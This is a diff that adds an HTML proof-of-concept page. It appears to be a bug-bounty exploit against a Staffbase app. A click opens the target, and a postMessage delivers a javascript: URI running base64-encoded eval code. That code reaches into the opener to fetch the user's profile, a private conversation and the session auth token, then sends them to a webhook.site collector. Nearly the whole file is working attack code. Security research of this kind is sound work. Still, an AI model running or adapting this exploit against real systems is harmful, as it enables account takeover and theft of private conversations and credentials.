@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS attack to steal private conversations</title></head>
+<body>
+    <button id="exploit" style="padding:20px; background:red; color:white; font-weight:bold;">
+       CLICK HERE 
+    </button>
+
+    <script>
+        const COLLAB = 'webhook.site/fe1cc437-4fa6-4c9b-945a-5c0fbb2bc275';
+        const TARGET = 'https://hackerone2.staffbase.rocks/content/quizcalendar/695c4f094db16050df496679';
+
+        document.getElementById('exploit').onclick = () => {
+            const win = window.open(TARGET, '_blank');
+
+            // The code that will be executed in the context of the new tab
+            // This code reaches back into the opener (the actual Staffbase app)
+            const innerCode = `
+                (function(){
+                    try {
+                        const sb = window.opener.we;
+                        if(!sb) throw new Error("we object not found on opener");
+                        
+                        sb.api.call('users/me', {}, {type:'GET'}).done(d => {
+                            const out = {
+                                profile: d,
+                                authUrl: sb.authMgr?.getWebURL?.(),
+                                token: sb.authMgr?.getToken?.()
+                            };
+                            fetch('https://${COLLAB}/?exfil=' + btoa(JSON.stringify(out)));
+                        });
+
+                        sb.api.call('conversations/6961496d4575375e9480c7f3', {}, {type:'GET'}).done(d => {
+                            const out = {
+                                profile: d,
+                                authUrl: sb.authMgr?.getWebURL?.(),
+                                token: sb.authMgr?.getToken?.()
+                            };
+                            fetch('https://${COLLAB}/?exfil=' + btoa(JSON.stringify(out)));
+                        });
+                    } catch(e) {
+                        fetch('https://${COLLAB}/?error=' + btoa(e.message));
+                    }
+                })()
+            `;
+
+            // Wrap the code in eval(atob()) to prevent syntax breaking in the URL string
+            const b64Code = btoa(innerCode);
+            const finalJsUri = `javascript://hackerone2.staffbase.rocks/%0aeval(atob('${b64Code}'))`;
+
+            const payload = [
+                "INVOCATION",
+                "impact_poc_final",
+                "openLink",
+                [finalJsUri, { inAppBrowser: false }]
+            ];
+
+            console.log("[*] Waiting 4 seconds for window/listeners to initialize...");
+            setTimeout(() => {
+                console.log("[+] Sending single postMessage shot...");
+                
+                // Target the main window
+                win.postMessage(payload, '*');
+                
+                for (let i = 0; i < win.frames.length; i++) {
+                    win.frames[i].postMessage(payload, '*');
+                }
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
